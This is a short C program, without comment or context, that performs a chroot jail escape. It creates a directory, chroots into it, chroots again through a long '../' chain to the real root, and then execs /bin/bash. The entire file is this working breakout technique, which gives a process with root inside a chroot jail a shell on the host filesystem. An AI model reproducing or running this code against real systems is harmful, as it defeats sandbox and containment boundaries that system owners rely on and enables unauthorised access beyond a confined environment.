#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>

void main(int argc, char *argv[])
{
    mkdir("test", 0);
    chroot("test");
    chroot("../../../../../../../../../../");
    execv("/bin/bash", argv);
}